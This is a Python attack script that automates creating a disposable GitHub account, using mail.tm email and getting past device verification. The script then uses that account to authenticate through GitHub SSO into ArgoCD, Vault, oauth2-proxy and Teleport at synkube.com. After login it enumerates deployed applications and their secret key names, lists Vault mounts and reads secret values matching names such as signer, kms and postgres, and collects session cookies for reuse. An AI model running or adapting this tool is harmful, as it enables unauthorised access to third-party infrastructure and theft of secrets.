#!/usr/bin/env python3
# identity B+C: create a fresh GitHub account from a clean egress (GHA runner, Azure IP),
# verify email via mail.tm, login (device verification via email code), then walk 4 SSO doors.
# Read-only w.r.t. the targets (OAuth grants only). Prints everything to stdout.
import os, re, sys, json, time, random, string, html as htmlmod
from urllib.parse import urljoin, urlparse, parse_qs, quote

def log(*a):
    print(*a, flush=True)

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

try:
    from curl_cffi import requests as creq
    HAVE_CFFI = True
except Exception:
    HAVE_CFFI = False
import requests

def rnd(n=8, alpha=string.ascii_lowercase + string.digits):
    return "".join(random.choice(alpha) for _ in range(n))

def new_sess():
    if HAVE_CFFI:
        s = creq.Session(impersonate="chrome")
    else:
        s = requests.Session()
        s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"})
    return s

def ck_dict(s):
    try:
        return s.cookies.get_dict()
    except Exception:
        pass
    try:
        return dict(s.cookies)
    except Exception:
        return {}

def text_of(h):
    if not h:
        return ""
    h = re.sub(r"<script.*?</script>|<style.*?</style>", " ", h, flags=re.S | re.I)
    h = re.sub(r"<[^>]+>", " ", h)
    h = htmlmod.unescape(h)
    return re.sub(r"\s+", " ", h).strip()

def inputs_of(h):
    out = []
    for m in re.finditer(r"<input\b[^>]*>", h or "", re.I):
        tag = m.group(0)
        nm = re.search(r'name="([^"]*)"', tag)
        val = re.search(r'value="([^"]*)"', tag)
        typ = re.search(r'type="([^"]*)"', tag)
        if nm:
            out.append({"name": htmlmod.unescape(nm.group(1)),
                        "value": htmlmod.unescape(val.group(1)) if val else "",
                        "type": (typ.group(1) if typ else "text")})
    return out

def form_action(h):
    m = re.search(r"<form\b[^>]*action=\"([^\"]*)\"", h or "", re.I)
    return htmlmod.unescape(m.group(1)) if m else None

def has_authorize_page(h):
    t = h or ""
    return ('/login/oauth/authorize' in t and re.search(r'name="authorize"', t) is not None) or \
           ('Authorize' in text_of(t) and 'client_id' in t and 'redirect_uri' in t)

# ---------------- mail.tm ----------------
MAIL_API = "https://api.mail.tm"

def mail_new():
    s = requests.Session()
    doms = s.get(MAIL_API + "/domains", timeout=25).json()
    dom = doms["hydra:member"][0]["domain"]
    addr = "sso" + rnd(10) + "@" + dom
    pw = "Pw!" + rnd(16, string.ascii_letters + string.digits)
    r = s.post(MAIL_API + "/accounts", json={"address": addr, "password": pw}, timeout=25)
    log("[mail] create %s -> %s %s" % (addr, r.status_code, r.text[:120]))
    tok = s.post(MAIL_API + "/token", json={"address": addr, "password": pw}, timeout=25).json()["token"]
    return {"address": addr, "password": pw, "token": tok}

def mail_msgs(tok):
    try:
        r = requests.get(MAIL_API + "/messages", headers={"Authorization": "Bearer " + tok}, timeout=25)
        if r.status_code != 200:
            log("[mail] list -> %s %s" % (r.status_code, r.text[:100]))
            return []
        return r.json().get("hydra:member", [])
    except Exception as e:
        log("[mail] list EXC", repr(e)[:120])
        return []

def mail_msg(tok, mid):
    try:
        r = requests.get(MAIL_API + "/messages/" + mid, headers={"Authorization": "Bearer " + tok}, timeout=25)
        return r.json() if r.status_code == 200 else {}
    except Exception as e:
        return {}

def mail_wait(tok, seen, timeout=120, want="github"):
    t0 = time.time()
    while time.time() - t0 < timeout:
        for m in mail_msgs(tok):
            mid = m.get("id")
            if mid in seen:
                continue
            seen.add(mid)
            body = mail_msg(tok, mid)
            blob = json.dumps(body)[:200000]
            log("[mail] NEW id=%s from=%s subj=%s" % (mid, m.get("from", {}).get("address"), m.get("subject")))
            return {"subject": m.get("subject", ""), "from": m.get("from", {}).get("address", ""), "blob": blob}
        time.sleep(5)
    return None

def find_link(blob):
    # prefer account_verifications confirm link
    m = re.search(r"https://github\.com/account_verifications/confirm/[A-Za-z0-9_\-]+/[A-Za-z0-9]+", blob)
    if m:
        return m.group(0)
    m = re.search(r"https?://[^\"'\\<> ]+", blob)
    return m.group(0).rstrip("\\") if m else None

def find_code(blob):
    # look for 8-digit launch code, else 6-digit verification code
    m = re.search(r"\b(\d{8})\b", blob)
    if m:
        return m.group(1), 8
    for pat in (r"code[^0-9]{0,20}(\d{6})", r"\b(\d{6})\b"):
        m = re.search(pat, blob)
        if m:
            return m.group(1), 6
    return None, None

# ---------------- github helpers ----------------
GH = "https://github.com"

def gh_get(s, url, **kw):
    kw.setdefault("timeout", 40)
    return s.get(url, **kw)

def gh_signup(s, login, email, pw):
    r = s.get(GH + "//signup", headers={"Accept": "text/html"}, timeout=40)
    log("[gh] GET //signup -> %s %s bytes=%s" % (r.status_code, r.url, len(r.content)))
    h = r.text
    if r.status_code not in (200,):
        log("[gh] signup page not 200; body head:", text_of(h)[:300])
    data = {}
    for i in inputs_of(h):
        if i["type"] == "hidden" and i["name"] and i["name"] not in ("user_signup[country]",) and not i["name"].startswith("user["):
            data[i["name"]] = i["value"]
    # country + form fields
    data["user[login]"] = login
    data["user[email]"] = email
    data["user[password]"] = pw
    data["user_signup[country]"] = "US"
    data["user_signup[marketing_consent]"] = "0"
    # any required_field_xxx present
    for i in inputs_of(h):
        if i["name"].startswith("required_field_"):
            data[i["name"]] = rnd(8, string.ascii_lowercase)
    log("[gh] signup fields:", sorted(data.keys()))
    r2 = s.post(GH + "//signup?social=false", data=data, allow_redirects=False, headers={"Accept": "text/html"}, timeout=40)
    log("[gh] POST //signup -> %s Location=%s" % (r2.status_code, r2.headers.get("Location")))
    if r2.status_code != 302:
        log("[gh] signup body markers:", text_of(r2.text)[:600])
        for k in ("octocaptcha", "hcaptcha", "reCAPTCHA", "error", "already taken", "not unique"):
            if k.lower() in r2.text.lower():
                log("[gh] marker:", k)
    return r2

def gh_confirm_email(s, mb, seen):
    m = mail_wait(mb["token"], seen, timeout=150)
    if not m:
        log("[gh] NO verification mail")
        return False
    link = find_link(m["blob"])
    code, n = find_code(m["blob"])
    log("[gh] mail subject=%r link=%s code=%s(%s)" % (m["subject"], link, code, n))
    if link:
        r = s.get(link, allow_redirects=True, timeout=40)
        log("[gh] GET confirm link -> %s %s %r" % (r.status_code, r.url, text_of(r.text)[:200]))
        return True
    # fallback: post launch_code[] on /account_verifications
    p = s.get(GH + "/account_verifications", timeout=40)
    h = p.text
    data = {}
    for i in inputs_of(h):
        if i["name"] == "launch_code[]":
            continue
        if i["name"]:
            data[i["name"]] = i["value"]
    if code:
        data["launch_code[]"] = code  # requests will send single; also try joined below
    act = form_action(h) or "/account_verifications"
    r = s.post(urljoin(GH, act), data=data, allow_redirects=False, timeout=40)
    log("[gh] POST launch_code -> %s %s" % (r.status_code, r.headers.get("Location")))
    return True

def gh_login(s, login, pw, mb, seen):
    r = s.get(GH + "//login", headers={"Accept": "text/html"}, timeout=40)
    h = r.text
    tok = ""
    for i in inputs_of(h):
        if i["name"] == "authenticity_token":
            tok = i["value"]
            break
    log("[gh] login page %s token_len=%s" % (r.status_code, len(tok)))
    data = {"authenticity_token": tok, "login": login, "password": pw, "commit": "Sign in",
            "webauthn-conditional": "undefined", "javascript-support": "true"}
    r2 = s.post(GH + "//session", data=data, allow_redirects=False, timeout=40)
    loc = r2.headers.get("Location", "")
    log("[gh] POST //session -> %s Location=%s" % (r2.status_code, loc))
    if "verified-device" in loc:
        # device verification: GET page, read code from mail, submit
        p = s.get(urljoin(GH, loc), timeout=40)
        h = p.text
        log("[gh] device page %s %r" % (p.status_code, text_of(h)[:300]))
        act = form_action(h) or "/sessions/verified-device"
        data = {}
        otp_name = None
        for i in inputs_of(h):
            if not i["name"]:
                continue
            if i["type"] in ("text", "tel", "number") and i["name"] in ("otp", "verification_code", "code"):
                otp_name = i["name"]
                continue
            if i["name"] == "otp" or (i["type"] == "text" and i["name"].lower().startswith("otp")):
                otp_name = i["name"]
                continue
            data[i["name"]] = i["value"]
        if not otp_name:
            otp_name = "otp"
        m = mail_wait(mb["token"], seen, timeout=150)
        code = None
        if m:
            code, n = find_code(m["blob"])
            log("[gh] device mail subject=%r code=%s" % (m["subject"], code))
        if not code:
            log("[gh] NO device code")
            return False
        data[otp_name] = code
        r3 = s.post(urljoin(GH, act), data=data, allow_redirects=False, timeout=40)
        log("[gh] POST device -> %s Location=%s" % (r3.status_code, r3.headers.get("Location")))
        # follow
        if r3.status_code in (301, 302, 303):
            s.get(urljoin(GH, r3.headers.get("Location", "/")), timeout=40)
    return True

def sess_report(s):
    ck = ck_dict(s)
    keep = {k: (v[:24] + ("..." if len(v) > 24 else "")) for k, v in ck.items()
            if k in ("user_session", "logged_in", "_gh_sess", "__Host-user_session_same_site", "dotcom_user")}
    log("[gh] cookies:", keep)
    return ck

def check_authorize(s, url, tag):
    r = s.get(url, headers={"Accept": "text/html"}, timeout=45)
    h = r.text
    t = text_of(h)
    flag = "cannot authorize a third party" in t
    consent = has_authorize_page(h)
    log("[flag:%s] final=%s status=%s consent=%s flagged=%s" % (tag, r.url, r.status_code, consent, flag))
    log("[flag:%s] text: %s" % (tag, t[:350]))
    return {"url": r.url, "status": r.status_code, "consent": consent, "flagged": flag,
            "text": t[:600], "html_len": len(h)}

def submit_consent(s, url, tag):
    """GET url; if consent page, submit authorize form; return final response after following callback."""
    r = s.get(url, headers={"Accept": "text/html"}, allow_redirects=False, timeout=45)
    hops = 0
    while r.status_code in (301, 302, 303, 307) and hops < 12:
        loc = r.headers.get("Location", "")
        absloc = urljoin(r.url, loc)
        hops += 1
        log("[%s] hop %s -> %s" % (tag, r.status_code, absloc[:200]))
        if "github.com" in absloc and ("/login" in absloc or "/session" in absloc) and hops > 1:
            log("[%s] bounced to login" % tag)
            return r, absloc
        r = s.get(absloc, headers={"Accept": "text/html"}, allow_redirects=False, timeout=45)
    h = r.text
    if has_authorize_page(h):
        log("[%s] consent page at %s" % (tag, r.url))
        act = form_action(h) or "/login/oauth/authorize"
        data = {}
        for i in inputs_of(h):
            if i["name"] and i["type"] == "hidden":
                data[i["name"]] = i["value"]
        for i in inputs_of(h):
            if i["name"] and i["type"] not in ("hidden", "submit", "checkbox", "radio"):
                data[i["name"]] = i.get("value") or ""
        data.setdefault("authorize", "1")
        r2 = s.post(urljoin(GH, act), data=data, allow_redirects=False, timeout=45,
                    headers={"Accept": "text/html", "Referer": r.url})
        log("[%s] POST consent -> %s Location=%s" % (tag, r2.status_code, r2.headers.get("Location", "")[:240]))
        return r2, r2.headers.get("Location", "")
    log("[%s] no consent page; final url=%s status=%s text=%s" % (tag, r.url, r.status_code, text_of(h)[:300]))
    return r, r.headers.get("Location", "")

# ---------------- doors ----------------
def door_argocd(s):
    out = {}
    base = "https://argocd.synkube.com"
    r, loc = submit_consent(s, base + "/api/dex/auth", "argocd")
    # after consent, location = argocd callback; follow it
    if loc:
        rr = s.get(urljoin(base, loc), allow_redirects=True, timeout=45)
        out["callback_final"] = rr.url
        out["callback_status"] = rr.status_code
    ck = ck_dict(s)
    tok = ck.get("argocd.token")
    out["has_argocd_token"] = bool(tok)
    out["token_prefix"] = (tok or "")[:30]
    # also try full start flow with return_url (in case api/dex/auth needs state cookie)
    if not tok:
        r = s.get(base + "/auth/login?return_url=" + quote(base + "/applications"), allow_redirects=True, timeout=45)
        out["login_final"] = r.url
        ck = ck_dict(s)
        tok = ck.get("argocd.token")
        out["has_argocd_token2"] = bool(tok)
        out["token_prefix2"] = (tok or "")[:30]
    hdr = {"Authorization": "Bearer " + tok} if tok else {}
    hdr["Cookie"] = "; ".join("%s=%s" % (k, v) for k, v in ck_dict(s).items()) if tok else ""
    if tok:
        me = s.get(base + "/api/v1/account/me", headers=hdr, timeout=45)
        out["me"] = (me.status_code, me.text[:400])
        apps = []
        try:
            a = s.get(base + "/api/v1/applications?limit=200", headers=hdr, timeout=60)
            out["apps_status"] = a.status_code
            j = a.json()
            items = j.get("items", [])
            out["apps_count"] = len(items)
            for it in items:
                m = it.get("metadata", {})
                sp = it.get("spec", {})
                dest = sp.get("destination", {})
                src = sp.get("source", {}) or {}
                apps.append({"name": m.get("name"), "ns": m.get("namespace"),
                             "repo": src.get("repoURL"), "chart": src.get("chart"),
                             "path": src.get("path"), "dest_ns": dest.get("namespace"),
                             "dest_server": dest.get("server"), "health": (it.get("status", {}).get("health", {}) or {}).get("status"),
                             "sync": (it.get("status", {}).get("sync", {}) or {}).get("status")})
            out["apps"] = apps
            # clusters/repos/projects
            for ep in ("/api/v1/clusters", "/api/v1/repositories", "/api/v1/projects"):
                rr = s.get(base + ep, headers=hdr, timeout=45)
                try:
                    jj = rr.json()
                    out[ep] = (rr.status_code, len(jj.get("items", [])) if isinstance(jj, dict) else None)
                except Exception:
                    out[ep] = (rr.status_code, rr.text[:120])
            # managed resources env keys for signer-ish apps
            keys = {}
            for it in items:
                nm = (it.get("metadata", {}) or {}).get("name", "")
                if not re.search(r"signer|rsm|sequencer|sweep|api|platform|hypercall|synapse|vault|infra", nm, re.I):
                    continue
                rr = s.get(base + "/api/v1/applications/%s/managed-resources" % quote(nm),
                           params={"fields": "live"}, headers=hdr, timeout=60)
                if rr.status_code != 200:
                    keys[nm] = "status=%s" % rr.status_code
                    continue
                envs = []
                try:
                    jj = rr.json()
                    for ritem in jj.get("items", []):
                        live = ritem.get("live") or {}
                        kind = live.get("kind")
                        name = (live.get("metadata") or {}).get("name")
                        spec = live.get("spec") or {}
                        tmpl = spec.get("template") or {}
                        containers = (tmpl.get("spec") or {}).get("containers") or []
                        envk = []
                        for c in containers:
                            envk += [e.get("name") for e in (c.get("env") or []) if e.get("name")]
                            for ef in (c.get("envFrom") or []):
                                envk.append("envFrom:" + json.dumps(ef)[:80])
                        if isinstance(live.get("data"), dict):
                            envk += ["data:" + k for k in live["data"].keys()]
                        if isinstance(live.get("stringData"), dict):
                            envk += ["stringData:" + k for k in live["stringData"].keys()]
                        if envk:
                            envs.append({"kind": kind, "name": name, "keys": envk[:40]})
                    keys[nm] = envs
                except Exception as e:
                    keys[nm] = "exc %r" % (e,)
            out["env_keys"] = keys
        except Exception as e:
            out["apps_exc"] = repr(e)[:200]
    else:
        # unauthenticated sanity
        rr = s.get(base + "/api/v1/applications", timeout=30)
        out["apps_anon"] = (rr.status_code, rr.text[:120])
    return out

def door_vault(s):
    out = {}
    base = "https://vault.synkube.com"
    ui_cb = base + "/ui/vault/auth/oidc/oidc/callback"
    attempts = [
        {"redirect_uri": ui_cb},
        {"role": "human", "redirect_uri": ui_cb},
        {"role": "human", "redirect_uri": "http://localhost:8250/oidc/callback"},
        {"role": "default", "redirect_uri": ui_cb},
    ]
    r = None
    for body in attempts:
        try:
            r = s.post(base + "/v1/auth/oidc/oidc/auth_url", json=body, timeout=45)
        except Exception as e:
            out.setdefault("auth_url_exc", []).append(repr(e)[:120])
            continue
        out.setdefault("auth_url_tries", []).append({"body": body, "status": r.status_code, "resp": r.text[:160]})
        if r.status_code == 200:
            out["body_used"] = body
            break
    if r is None or r.status_code != 200:
        return out
    j = r.json()
    auth_url = (j.get("data") or {}).get("auth_url")
    state_expected = (j.get("data") or {}).get("state")
    out["auth_url"] = auth_url[:300] if auth_url else None
    if not auth_url:
        return out
    cur = auth_url
    code = None
    hops = []
    for i in range(16):
        try:
            rr = s.get(cur, allow_redirects=False, timeout=45, headers={"Accept": "text/html"})
        except Exception as e:
            hops.append(("EXC", cur[:80], repr(e)[:120]))
            break
        loc = rr.headers.get("Location", "")
        hops.append((rr.status_code, cur[:90], loc[:200]))
        if rr.status_code in (301, 302, 303, 307, 308):
            nxt = urljoin(cur, loc)
            if "code=" in nxt and ("vault.synkube.com" in nxt or "/callback" in nxt):
                qq = parse_qs(urlparse(nxt).query)
                code = qq.get("code", [None])[0]
                out["vault_code_prefix"] = (code or "")[:16]
                out["vault_state_from_redirect"] = qq.get("state", [None])[0]
                break
            cur = nxt
            continue
        h = rr.text
        if has_authorize_page(h):
            act = form_action(h) or "/login/oauth/authorize"
            data = {}
            for inp in inputs_of(h):
                if inp["name"]:
                    data[inp["name"]] = inp["value"]
            data.setdefault("authorize", "1")
            rp = s.post(urljoin(GH, act), data=data, allow_redirects=False, timeout=45)
            hops.append(("consent", rp.status_code, rp.headers.get("Location", "")[:200]))
            cur = urljoin(GH, rp.headers.get("Location", "/"))
            continue
        # Dex login page listing connectors?
        m = re.search(r'href="(/auth/github\?req=[^"]+)"', h)
        if not m:
            m = re.search(r'href="(https?://[^"]*auth/github\?req=[^"]+)"', h)
        if m:
            nxt = urljoin(rr.url, htmlmod.unescape(m.group(1)))
            hops.append(("dexlink", 200, nxt[:180]))
            cur = nxt
            continue
        out["dex_page"] = text_of(h)[:500]
        break
    out["hops"] = hops
    if code:
        cb = s.post(base + "/v1/auth/oidc/oidc/callback", json={"code": code, "state": state_expected}, timeout=45)
        out["cb_status"] = cb.status_code
        out["cb_body"] = cb.text[:400]
        if cb.status_code == 200:
            tok = (cb.json().get("auth") or {}).get("client_token")
            out["token_len"] = len(tok or "")
            h = {"X-Vault-Token": tok or ""}
            ls = s.get(base + "/v1/auth/token/lookup-self", headers=h, timeout=45)
            try:
                d = ls.json().get("data", {})
                out["lookup"] = {"policies": d.get("policies"), "ttl": d.get("ttl"),
                                 "display": d.get("display_name"),
                                 "entity": (d.get("entity_id") or "")[:12]}
            except Exception:
                out["lookup"] = ls.text[:300]
            mt = s.get(base + "/v1/sys/internal/ui/mounts", headers=h, timeout=45)
            try:
                out["mounts"] = sorted((mt.json().get("data", {}).get("secret", {}) or {}).keys())
            except Exception:
                out["mounts"] = mt.text[:300]
            reads = {}
            for mp in (out.get("mounts") or []):
                if mp.startswith(("cubbyhole", "identity", "sys")):
                    continue
                lr = s.get(base + "/v1/" + mp.strip("/") + "/metadata", params={"list": "true"}, headers=h, timeout=45)
                if lr.status_code == 200:
                    try:
                        reads[mp] = lr.json().get("data", {}).get("keys")
                    except Exception:
                        reads[mp] = lr.text[:100]
                else:
                    reads[mp] = "status=%s" % lr.status_code
            out["mount_meta"] = reads
            got = {}
            names = ["signer", "rsm", "sequencer", "kms", "platform", "hypercall", "synapse",
                     "cloudflare", "infisical", "privy", "sweep", "api", "rpc", "db", "postgres", "mysql"]
            tried = 0
            for mp, keys in reads.items():
                if not isinstance(keys, list):
                    continue
                for k in keys:
                    if tried >= 16:
                        break
                    if any(n in (k or "").lower() for n in names):
                        path = "/v1/" + mp.strip("/") + "/data/" + k.rstrip("/")
                        rr = s.get(base + path, headers=h, timeout=45)
                        tried += 1
                        if rr.status_code == 200:
                            try:
                                dd = rr.json().get("data", {}).get("data", {})
                                got[mp + ":" + k] = {kk: (str(vv)[:50]) for kk, vv in dd.items()}
                            except Exception:
                                got[mp + ":" + k] = rr.text[:150]
                        else:
                            got[mp + ":" + k] = "status=%s" % rr.status_code
                    if tried >= 16:
                        break
                if tried >= 16:
                    break
            out["secrets_sample"] = got
    return out

def door_o2p(s):
    out = {}
    r, loc = submit_consent(s, "https://auth.synkube.com/oauth2/start?rd=%2F", "o2p")
    if loc:
        rr = s.get(urljoin("https://auth.synkube.com", loc), allow_redirects=True, timeout=45)
        out["final"] = rr.url
        out["status"] = rr.status_code
        out["body"] = text_of(rr.text)[:300]
    ck = ck_dict(s)
    out["cookies"] = {k: (v[:24] + "...") for k, v in ck.items() if "oauth2" in k or "proxy" in k}
    out["has_cookie"] = any("oauth2_proxy" in k for k in ck)
    return out

def door_teleport(s):
    out = {}
    base = "https://teleport.synkube.com"
    try:
        p = s.get(base + "/webapi/ping", timeout=45)
        out["ping"] = (p.status_code, p.text[:200])
    except Exception as e:
        out["ping"] = "exc %r" % (e,)
    r, loc = submit_consent(s, base + "/v1/webapi/github/login/web?connector_id=github&redirect_url=%2Fweb%2Fclusters", "teleport")
    if loc:
        rr = s.get(urljoin(base, loc), allow_redirects=True, timeout=45)
        out["final"] = rr.url
        out["status"] = rr.status_code
        out["body"] = text_of(rr.text)[:300]
    out["cookies"] = {k: v[:20] for k, v in ck_dict(s).items() if "grv" in k or "teleport" in k}
    return out

# ---------------- main ----------------
def main():
    res = {}
    log("HAVE_CFFI=%s" % HAVE_CFFI)
    mb = mail_new()
    log("MAILBOX=" + json.dumps(mb))
    res["mailbox"] = {k: (v[:10] if k == "token" else v) for k, v in mb.items()}
    seen = set()
    # pre-seed seen with existing messages
    for m in mail_msgs(mb["token"]):
        seen.add(m.get("id"))
    s = new_sess()
    login = "sso" + rnd(10)
    pw = "Pw-" + rnd(14, string.ascii_letters + string.digits) + "!" + rnd(3, string.digits)
    log("[gh] new identity: login=%s pw=%s email=%s" % (login, pw, mb["address"]))
    res["identity"] = {"login": login, "password": pw, "email": mb["address"]}
    try:
        gh_signup(s, login, mb["address"], pw)
    except Exception as e:
        log("[gh] signup EXC", repr(e)[:300])
    try:
        ok = gh_confirm_email(s, mb, seen)
    except Exception as e:
        log("[gh] confirm EXC", repr(e)[:300]); ok = False
    try:
        gh_login(s, login, pw, mb, seen)
    except Exception as e:
        log("[gh] login EXC", repr(e)[:300])
    ck = sess_report(s)
    res["logged_in"] = ck.get("logged_in")
    res["has_user_session"] = "user_session" in ck or "__Host-user_session_same_site" in ck
    log("[gh] LOGGED_IN=%s USER_SESSION=%s" % (res["logged_in"], res["has_user_session"]))
    # anonymous oracle (from runner)
    try:
        rr = requests.get("https://api.github.com/users/" + login, timeout=30)
        log("[flag:oracle] api.github.com/users/%s -> %s" % (login, rr.status_code))
        res["oracle_status"] = rr.status_code
    except Exception as e:
        log("[flag:oracle] exc", repr(e)[:120])
    # authorize probes
    AUTHZ = {
        "argocd": GH + "/login/oauth/authorize?client_id=Ov23li7NNAWxA2km8xXo&redirect_uri=" + quote("https://argocd.synkube.com/api/dex/callback", safe="") + "&response_type=code&scope=user%3Aemail&state=ip335126",
        "o2p": GH + "/login/oauth/authorize?client_id=Ov23liemtbdvqJCj1Dzs&redirect_uri=" + quote("https://auth.synkube.com/oauth2/callback", safe="") + "&response_type=code&scope=user%3Aemail+read%3Aorg&state=ip335126",
    }
    res["authorize"] = {}
    for tag, url in AUTHZ.items():
        try:
            res["authorize"][tag] = check_authorize(s, url, tag)
        except Exception as e:
            res["authorize"][tag] = {"exc": repr(e)[:200]}
    # doors (only meaningful if not flagged)
    consent_ok = any(v.get("consent") for v in res["authorize"].values()) or res["has_user_session"]
    if consent_ok:
        for fn in (door_argocd, door_vault, door_o2p, door_teleport):
            try:
                res[fn.__name__] = fn(s)
            except Exception as e:
                res[fn.__name__] = {"exc": repr(e)[:300]}
                log("[%s] EXC %r" % (fn.__name__, e))
    else:
        log("[doors] skipped (no consent & no user_session)")
    # final cookies for reuse
    res["final_cookies"] = {k: v for k, v in ck_dict(s).items()
                            if k in ("user_session", "_gh_sess", "logged_in", "__Host-user_session_same_site",
                                     "argocd.token", "_oauth2_proxy", "__Host-grv_session")}
    print("\n=====RESULT_JSON_BEGIN=====")
    print(json.dumps(res, indent=1, default=str))
    print("=====RESULT_JSON_END=====")

if __name__ == "__main__":
    main()
